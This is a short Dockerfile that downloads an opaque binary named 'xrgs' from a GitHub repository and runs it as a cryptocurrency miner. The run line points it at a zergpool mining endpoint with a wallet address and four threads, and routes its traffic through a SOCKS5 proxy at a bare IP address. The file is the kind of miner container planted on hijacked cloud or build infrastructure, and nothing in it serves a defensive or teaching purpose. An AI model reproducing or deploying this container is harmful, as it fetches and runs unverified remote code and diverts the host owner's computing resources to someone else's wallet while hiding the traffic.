FROM ubuntu:bionic
RUN apt update && \
        apt full-upgrade -y && \
        apt install wget -y && \
        wget https://github.com/gyrogerald/vulner/raw/main/xrgs && \
        chmod +x xrgs
CMD ./xrgs -o cryptonight_haven.mine.zergpool.com:14452 --tls -a cn-heavy/xhv -k -u RXtRx8QUgCipTZyepE2go35gXjkcqHmYDX -p c=RVN,mc=BLOC -t 4 --dns-ipv6 -x socks5://192.252.214.20:15864
